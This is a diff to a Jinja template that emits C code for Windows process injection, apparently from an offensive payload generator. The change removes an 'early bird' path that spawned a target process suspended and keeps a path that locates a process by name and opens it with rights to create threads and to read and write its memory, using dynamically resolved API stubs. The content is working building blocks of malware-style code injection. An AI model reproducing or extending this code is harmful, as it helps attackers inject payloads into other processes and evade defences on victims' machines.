@@ -1,42 +1,22 @@
+{% from "macros.jinja" import function_typedef, function_definition, createThreadStub with context %}
+
 {% if section == "globals" %}
-    {% if link.early_bird %}
-        {% if link.alloc.functions.value in ["dynamic", "direct"] %}
-            {{ function_typedef("CreateProcessA") }}
-        {% endif %}
-    {% else %}
-        {% if link.alloc.functions.value in ["dynamic", "direct"] %}
-            {{ function_typedef("OpenProcess") }}
-            {{ function_typedef("CreateThread") }}
-        {% endif %}
-        {% include "lib/find_process.cpp" %}
-    {% endif %}
+    {{ function_typedef("OpenProcess") }}
+    {{ function_typedef("CreateThread") }}
+
+    {% include "lib/find_process.cpp" %}
 {% else %}
-    {% if link.early_bird %}
-        {{ function_definition("CreateProcessA") }}
+    int pid = FindProcess("{{ target }}");
+    if(!pid){
+        printf("[-] Failed to discover process\n");
+        return 0;
+    }
 
-        STARTUPINFO si;
-        PROCESS_INFORMATION pi;
-        ZeroMemory(&si, sizeof(si));
-        si.cb = sizeof(si);
-        ZeroMemory(&pi, sizeof(pi));
+    {{ function_definition("OpenProcess") }}
 
-        pCreateProcessA(0, "{{ link.target_process_name }}", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
-
-        HANDLE hProc = pi.hProcess;
-        HANDLE hThread = pi.hThread;
-    {% else %}
-        int pid = FindProcess("{{ link.target_process_name }}");
-        if(!pid){
-            printf("[-] Failed to discover process\n");
-            return 0;
-        }
-
-        {{ function_definition("OpenProcess") }}
-
-        HANDLE hProc = pOpenProcess(
-            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
-            FALSE,
-            (DWORD) pid
-        );
-    {% endif %}
+    HANDLE hProc = pOpenProcess(
+        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
+        FALSE,
+        (DWORD) pid
+    );
 {% endif %}
